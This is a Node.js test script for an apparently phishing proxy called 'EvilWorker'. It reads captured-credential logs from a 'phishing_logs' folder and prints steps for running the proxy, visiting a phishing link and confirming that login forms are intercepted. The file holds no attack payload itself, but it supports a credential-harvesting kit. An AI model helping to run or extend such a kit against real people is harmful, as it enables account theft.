const fs = require('fs');
const path = require('path');

// Test script to verify credential capture
console.log('🧪 EvilWorker Credential Capture Test\n');

// Function to decrypt and display logs
async function decryptLog(logLine) {
    try {
        const logData = JSON.parse(logLine);
        const iv = Object.keys(logData)[0];
        const encryptedData = logData[iv];
        
        // Simple decryption (you'll need to implement proper decryption)
        console.log('📄 Log Entry:');
        console.log(`   IV: ${iv}`);
        console.log(`   Encrypted Data: ${encryptedData.substring(0, 100)}...`);
        console.log('   (Decryption not implemented in this test script)');
        console.log('');
    } catch (error) {
        console.log('❌ Failed to parse log entry');
    }
}

// Function to check log files
function checkLogFiles() {
    const logsDir = path.join(__dirname, 'phishing_logs');
    
    if (!fs.existsSync(logsDir)) {
        console.log('❌ No phishing_logs directory found');
        return;
    }
    
    const files = fs.readdirSync(logsDir);
    
    if (files.length === 0) {
        console.log('❌ No log files found in phishing_logs directory');
        return;
    }
    
    console.log(`✅ Found ${files.length} log file(s):`);
    
    files.forEach(file => {
        const filePath = path.join(logsDir, file);
        const stats = fs.statSync(filePath);
        const size = stats.size;
        
        console.log(`   📁 ${file} (${size} bytes)`);
        
        if (size > 0) {
            try {
                const content = fs.readFileSync(filePath, 'utf8');
                const lines = content.split('\n').filter(line => line.trim());
                
                console.log(`   📊 ${lines.length} log entries found`);
                
                // Show first few lines
                lines.slice(0, 3).forEach((line, index) => {
                    console.log(`   Entry ${index + 1}: ${line.substring(0, 100)}...`);
                });
                
                if (lines.length > 3) {
                    console.log(`   ... and ${lines.length - 3} more entries`);
                }
                
            } catch (error) {
                console.log(`   ❌ Error reading file: ${error.message}`);
            }
        }
        
        console.log('');
    });
}

// Function to check session data
function checkSessionData() {
    console.log('🔍 Checking for active sessions...');
    
    // This would require accessing the VICTIM_SESSIONS object
    // For now, we'll just check if the server is running
    console.log('📋 To check session data, look at the server console output');
    console.log('   The server should show debug information for each request');
    console.log('');
}

// Main test function
function runTests() {
    console.log('1️⃣ Checking log files...');
    checkLogFiles();
    
    console.log('2️⃣ Checking session data...');
    checkSessionData();
    
    console.log('📋 Testing Instructions:');
    console.log('   1. Start the server with: node proxy_server.js');
    console.log('   2. Visit the phishing link in your browser');
    console.log('   3. Try to log in with test credentials');
    console.log('   4. Check the server console for debug output');
    console.log('   5. Check the phishing_logs directory for captured data');
    console.log('');
    
    console.log('🔧 To disable redirects for testing:');
    console.log('   - Set ENABLE_CREDENTIAL_REDIRECT=false environment variable');
    console.log('   - Or modify config.js to set enableRedirect: false');
    console.log('');
    
    console.log('🎯 Expected Behavior:');
    console.log('   - Server should capture all requests and responses');
    console.log('   - Login forms should be intercepted');
    console.log('   - Credentials should be logged (encrypted)');
    console.log('   - No automatic redirect should occur during testing');
}

// Run the tests
runTests();
